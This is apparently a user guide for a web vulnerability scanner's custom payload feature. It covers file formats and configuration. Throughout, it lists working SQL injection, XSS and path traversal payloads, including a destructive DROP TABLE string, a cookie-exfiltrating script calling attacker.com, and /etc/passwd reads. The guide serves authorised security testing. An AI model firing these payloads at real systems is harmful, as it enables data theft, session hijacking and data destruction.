# Custom Payload System - User Guide

## 📁 Overview

The vulnerability scanner now supports **custom payload files**! You can add your own attack vectors to enhance detection capabilities.

## 🎯 Supported Formats

### 1. Text Files (.txt)
Simple format - one payload per line

```txt
# Comments start with #
payload1
payload2
payload3
```

### 2. JSON Files (.json)
Structured format with metadata

```json
{
  "description": "My custom payloads",
  "payloads": [
    "payload1",
    "payload2",
    "payload3"
  ]
}
```

## 📂 Directory Structure

```
scanner-core/
└── payloads/
    ├── sqli.txt              # SQL Injection payloads
    ├── xss.txt               # XSS payloads
    ├── path_traversal.json   # Path traversal payloads
    ├── custom_sqli.txt       # Your custom SQLi payloads
    └── advanced_xss.json     # Your custom XSS payloads
```

## 🚀 How to Use

### Method 1: Add to Existing Files

Simply add your payloads to the existing files:

**scanner-core/payloads/sqli.txt:**
```txt
# Your custom SQLi payloads
' OR 1=1; DROP TABLE users--
admin' UNION SELECT * FROM passwords--
```

### Method 2: Create New Payload Files

Create your own payload file:

**scanner-core/payloads/my_custom_sqli.txt:**
```txt
# My advanced SQL injection payloads
' AND (SELECT COUNT(*) FROM users) > 0--
' UNION SELECT username, password FROM admin--
```

Then use it in your scan configuration.

### Method 3: Use JSON Format

**scanner-core/payloads/my_xss.json:**
```json
{
  "description": "Advanced XSS payloads for modern frameworks",
  "payloads": [
    "<script>fetch('https://attacker.com?c='+document.cookie)</script>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<svg><script>alert(document.domain)</script></svg>"
  ]
}
```

## 🔧 Configuration

### Via Scan Config (Frontend)

When creating a scan, you can specify custom payload files:

```javascript
{
  target_url: "https://example.com",
  scan_type: "custom",
  config: {
    owasp: true,
    custom_payloads: {
      sqli: ["sqli.txt", "custom_sqli.txt"],
      xss: ["xss.txt", "my_xss.json"],
      path_traversal: ["path_traversal.json"]
    }
  }
}
```

### Via Python Module

```python
from owasp.a03_injection import SQLiModule

# Use default + custom payloads
scanner = SQLiModule(
    target_url="https://example.com",
    custom_payloads=["sqli.txt", "custom_sqli.txt"]
)

# Run scan
findings = scanner.scan(urls)
```

## 📝 Payload File Examples

### SQL Injection (sqli.txt)
```txt
# Boolean-based blind
' OR '1'='1
' OR 1=1--

# Union-based
' UNION SELECT NULL--
' UNION SELECT username, password FROM users--

# Time-based
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### XSS (xss.txt)
```txt
# Basic XSS
<script>alert(1)</script>
<img src=x onerror=alert(1)>

# Event handlers
<body onload=alert(1)>
<svg/onload=alert(1)>

# Filter bypass
<scr<script>ipt>alert(1)</scr</script>ipt>
```

### Path Traversal (path_traversal.json)
```json
{
  "description": "Directory traversal payloads",
  "payloads": [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd"
  ]
}
```

## 🎨 Advanced Features

### 1. Payload Merging

The system automatically merges default payloads with your custom ones:

```python
# Default payloads: 10
# Custom file 1: 20 payloads
# Custom file 2: 15 payloads
# Total used: 45 payloads (duplicates removed)
```

### 2. Caching

Payload files are cached in memory for performance:
- First load: Reads from disk
- Subsequent uses: Uses cached version

### 3. Comments

Use `#` for comments in .txt files:

```txt
# This is a comment - will be ignored
' OR 1=1--  # This payload will be used
```

## 📊 Supported Modules

| Module | Default File | Custom Support |
|--------|-------------|----------------|
| SQL Injection | sqli.txt | ✅ Yes |
| XSS | xss.txt | ✅ Yes |
| Path Traversal | path_traversal.json | ✅ Yes |
| SSRF | ssrf.txt | ⏳ Coming soon |
| XXE | xxe.txt | ⏳ Coming soon |

## 🔒 Security Notes

> [!WARNING]
> **Use Responsibly**
> - Only use on systems you own or have permission to test
> - Some payloads may cause damage or data loss
> - Always test in a safe environment first

> [!TIP]
> **Best Practices**
> - Start with a small set of payloads
> - Test payload effectiveness before adding to production
> - Document your custom payloads
> - Share effective payloads with your team

## 📚 Payload Resources

Popular payload repositories:
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **SecLists**: https://github.com/danielmiessler/SecLists
- **FuzzDB**: https://github.com/fuzzdb-project/fuzzdb

## 🛠️ Creating Your Own Payloads

### Tips for Effective Payloads

1. **Test variations**: Include encoded, case-varied, and obfuscated versions
2. **Target-specific**: Create payloads for specific technologies
3. **Document**: Add comments explaining what each payload tests
4. **Organize**: Group similar payloads together

### Example: Custom SQLi Payloads

```txt
# MySQL-specific
' UNION SELECT @@version--
' AND extractvalue(1,concat(0x7e,version()))--

# PostgreSQL-specific
' UNION SELECT version()--
'; SELECT pg_sleep(5)--

# MSSQL-specific
'; WAITFOR DELAY '0:0:5'--
' UNION SELECT @@version--

# Oracle-specific
' UNION SELECT banner FROM v$version--
' AND 1=UTL_INADDR.get_host_address('attacker.com')--
```

## 🎯 Quick Start

1. **Navigate to payloads directory:**
   ```bash
   cd scanner-core/payloads
   ```

2. **Create your payload file:**
   ```bash
   echo "' OR 1=1--" > my_payloads.txt
   echo "admin' --" >> my_payloads.txt
   ```

3. **Use in scan:**
   Configure your scan to use `my_payloads.txt`

4. **Check results:**
   View findings in the scan results

---

**Happy Hunting! 🎯**
